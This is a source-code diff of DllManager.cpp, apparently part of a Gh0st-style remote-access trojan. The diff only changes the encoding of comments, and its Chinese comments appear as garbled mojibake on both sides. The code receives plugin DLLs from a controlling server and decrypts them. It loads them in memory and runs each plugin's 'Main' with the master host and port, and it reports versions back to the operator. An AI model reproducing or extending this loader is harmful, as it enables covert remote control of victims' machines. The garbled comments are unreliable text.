@@ -1,4 +1,4 @@
-ï»¿// DllManager.cpp: implementation of the CDllManager class.
+// DllManager.cpp: implementation of the CDllManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -39,7 +39,7 @@ CDllManager::CDllManager(CClientSocket *pClient, LPBYTE lparam/*, DWORD dwDataSi
 	SetEvent(hNewThreadInitializedEvent);
 	Send(token, 1 + 4 + dwDllNameLen + dwDataSize);
 	LocalFree(token);
-// 	puts("ä»¥è·å¾—å¼€å§‹åŠ è½½DLLæ¶ˆæ¯");
+// 	puts("ÒÔ»ñµÃ¿ªÊ¼¼ÓÔØDLLÏûÏ¢");
 //	MessageBox(NULL, "1", "", NULL);
 }
 
@@ -53,15 +53,15 @@ void CDllManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	{
 	case COMMAND_DLLOK:
 		{
-// 			puts("å…è®¸åŠ è½½DLL");
+// 			puts("ÔÊĞí¼ÓÔØDLL");
 			LoadLib(lpBuffer+1);
-// 			puts("åŠ è½½DLLå®Œæ¯•");
+// 			puts("¼ÓÔØDLLÍê±Ï");
 		}
 		break;
 	case COMMAND_DLLVERSION:
 		{
 			Sleep(80);
-// 			puts("å‘é€ç‰ˆæœ¬");
+// 			puts("·¢ËÍ°æ±¾");
 			SendDllVersion(m_strCurrentProcessFileName);;
 		}
 		break;
@@ -76,7 +76,7 @@ void CDllManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	}
 }
 
-void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //è§£å¯†
+void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //½âÃÜ
 {
 	unsigned long i;
 	unsigned char p;
@@ -114,22 +114,22 @@ LPBYTE CDllManager::getDllVersion(LPCTSTR lpDllName)
 		hDllFile = CreateFile(strSysPath,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 		if (hDllFile == INVALID_HANDLE_VALUE)
 		{
-			//OutputDebugStringA("æ‰“å¼€æ–‡ä»¶å¤±è´¥");
+			//OutputDebugStringA("´ò¿ªÎÄ¼şÊ§°Ü");
 		}
 		SizeDll  = GetFileSize(hDllFile,0);
 		if (!SizeDll == 0)
 		{
-			//OutputDebugStringA("è·å¾—å¤§å°æˆåŠŸ");
+			//OutputDebugStringA("»ñµÃ´óĞ¡³É¹¦");
 		}
 		
 		MemDll = malloc(SizeDll);
 		if (!MemDll == 0)
 		{
-			//OutputDebugStringA("ç”³è¯·å†…å­˜æˆåŠŸ");
+			//OutputDebugStringA("ÉêÇëÄÚ´æ³É¹¦");
 		}
 		if (ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0)==TRUE)
 		{
-			//OutputDebugStringA("è¯»å…¥æ•°æ®æˆåŠŸ");
+			//OutputDebugStringA("¶ÁÈëÊı¾İ³É¹¦");
 		}
 		CloseHandle(hDllFile);
 		DecryptPlug((unsigned char *)MemDll,SizeDll,1024);
@@ -144,7 +144,7 @@ LPBYTE CDllManager::getDllVersion(LPCTSTR lpDllName)
 			if(lpproc != NULL)
 				strcpy(strdllversion ,(char *)(*lpproc)());
 			MemoryFreeLibrary(hdllmod);	
-			////å‘é€æœåŠ¡ç‰ˆæœ¬
+			////·¢ËÍ·şÎñ°æ±¾
 			lpBuffer[0] = TOKEN_DLLVERSION;
 			dwOffset = 1;
 			
@@ -158,7 +158,7 @@ LPBYTE CDllManager::getDllVersion(LPCTSTR lpDllName)
 			return lpBuffer;
 		}
 	}
-	//åŠ è½½å¤±è´¥ï¼Œè¦æ±‚é‡ä¼ 
+	//¼ÓÔØÊ§°Ü£¬ÒªÇóÖØ´«
 	lpBuffer[0] = TOKEN_DLLLOADERROR;
 	dwOffset = 1;
 	memcpy(lpBuffer + dwOffset, lpDllName, lstrlen(lpDllName) + 1);
@@ -196,7 +196,7 @@ void CDllManager::LoadLib(LPBYTE xlparam)
 	
 	if(GetFileAttributes(strSysPath) != -1)
 	{
-		hDllFile =CreateFile(strSysPath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//è¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°è°ƒç”¨ä¸Šé¢é‚£ä¸ªGetModuleFileName
+		hDllFile =CreateFile(strSysPath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//ÕâÀïµÚÒ»¸ö²ÎÊıµ÷ÓÃÉÏÃæÄÇ¸öGetModuleFileName
 		SizeDll  =GetFileSize(hDllFile,0);
 		MemDll   =VirtualAlloc(0,SizeDll,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
 		ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0);
@@ -209,10 +209,10 @@ void CDllManager::LoadLib(LPBYTE xlparam)
 		{
 			DLLMain lpproc;
 			lpproc = (DLLMain)MemoryGetProcAddress(hdllmod,"Main");
-			//puts("å‡†å¤‡åŠ è½½");
+			//puts("×¼±¸¼ÓÔØ");
 			if(lpproc!=NULL)
 			{
-				//puts("åŠ è½½æˆåŠŸ");
+				//puts("¼ÓÔØ³É¹¦");
 				SendToken(TOKEN_DLLOK);
 				(*lpproc)(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort, xlparam);
 			}
@@ -226,19 +226,19 @@ void CDllManager::LoadLib(LPBYTE xlparam)
 
 void CDllManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 {
-	// ä¼ è¾“å®Œæ¯•
+	// ´«ÊäÍê±Ï
 	BYTE	*pData;
 	DWORD	dwBytesToWrite;
 	DWORD	dwBytesWrite;
-	int		nHeadLength = 9; // 1 + 4 + 4  æ•°æ®åŒ…å¤´éƒ¨å¤§å°ï¼Œä¸ºå›ºå®šçš„9
+	int		nHeadLength = 9; // 1 + 4 + 4  Êı¾İ°üÍ·²¿´óĞ¡£¬Îª¹Ì¶¨µÄ9
 
 	FILESIZEDLL	*pFileSize;
-	// å¾—åˆ°æ•°æ®çš„åç§»
+	// µÃµ½Êı¾İµÄÆ«ÒÆ
 	pData = lpBuffer + 8;
 	
 	pFileSize = (FILESIZEDLL *)lpBuffer;
 	
-	// å¾—åˆ°æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„åç§»
+	// µÃµ½Êı¾İÔÚÎÄ¼şÖĞµÄÆ«ÒÆ
 	LONG	dwOffsetHigh = pFileSize->dwSizeHigh1;
 	LONG	dwOffsetLow = pFileSize->dwSizeLow1;
 	
@@ -262,7 +262,7 @@ void CDllManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
 	
 	int nRet = 0;
-	// å†™å…¥æ–‡ä»¶
+	// Ğ´ÈëÎÄ¼ş
 	nRet = WriteFile
 		(
 		hFile,
@@ -272,9 +272,9 @@ void CDllManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 		NULL
 		);
 	// 	if (nRet <= 0)
-	// 		printf("æ–‡ä»¶å†™å…¥å¤±è´¥");
+	// 		printf("ÎÄ¼şĞ´ÈëÊ§°Ü");
 	CloseHandle(hFile);
-	// ä¸ºäº†æ¯”è¾ƒï¼Œè®¡æ•°å™¨é€’å¢
+	// ÎªÁË±È½Ï£¬¼ÆÊıÆ÷µİÔö
 	
 	BYTE	bToken[9];
 	bToken[0] = TOKEN_DATA_CONTINUE;
@@ -287,7 +287,7 @@ void CDllManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
 void CDllManager::CreateLocalRecvFile(LPBYTE lpBuffer)
 {
 	FILESIZEDLL	*pFileSize = (FILESIZEDLL *)lpBuffer;
-	// ä¿å­˜æ–‡ä»¶é•¿åº¦
+	// ±£´æÎÄ¼ş³¤¶È
 	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh1 << 32) + pFileSize->dwSizeLow1;
 
 	GetFileData();
@@ -297,7 +297,7 @@ void CDllManager::GetFileData()
 {
 	int	nTransferMode = TRANSFER_MODE_OVERWRITE;
 	
-	//  1å­—èŠ‚Token,å››å­—èŠ‚åç§»é«˜å››ä½ï¼Œå››å­—èŠ‚åç§»ä½å››ä½
+	//  1×Ö½ÚToken,ËÄ×Ö½ÚÆ«ÒÆ¸ßËÄÎ»£¬ËÄ×Ö½ÚÆ«ÒÆµÍËÄÎ»
 	BYTE	bToken[9];
 	memset(bToken, 0, sizeof(bToken));
 	bToken[0] = TOKEN_DATA_CONTINUE;
@@ -316,7 +316,7 @@ void CDllManager::GetFileData()
 		FILE_ATTRIBUTE_NORMAL,
 		0
 		);
-	// éœ€è¦é”™è¯¯å¤„ç†
+	// ĞèÒª´íÎó´¦Àí
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		m_nCurrentProcessFileLength = 0;
